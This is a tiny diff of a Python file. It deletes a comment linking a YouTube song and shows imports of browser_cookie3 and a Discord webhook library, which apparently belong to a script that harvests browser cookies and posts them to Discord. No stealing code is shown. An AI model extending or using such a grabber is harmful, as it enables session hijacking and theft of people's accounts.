@@ -1,4 +1,4 @@
-#created on https://www.youtube.com/watch?v=I0cp_C-3jZ8&list=RDGfwYBjHit8o&index=6 best song no cap
+
 
 import browser_cookie3
 from discord_webhook import DiscordWebhook, DiscordEmbed
